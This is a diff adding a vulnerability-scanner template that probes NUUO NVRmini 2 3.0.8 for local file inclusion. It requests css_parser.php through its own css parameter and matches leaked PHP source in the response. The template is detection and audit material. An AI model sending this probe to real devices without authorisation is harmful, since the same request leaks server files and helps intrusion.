@@ -1,0 +1,25 @@
+id: nuuo-file-inclusion
+name: NUUO NVRmini 2 3.0.8 - Local File Inclusion
+severity: high
+confidence: tentative
+description: NUUO NVRmini 2 3.0.8 is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- lfi
+- edb
+- nuuo
+- vuln
+requests:
+- method: GET
+  path: /css_parser.php?css=css_parser.php
+  matchers:
+  - type: body
+    words:
+    - $_GET['css']
+  - type: header
+    words:
+    - text/css
+  - type: status
+    status:
+    - 200
+  condition: and
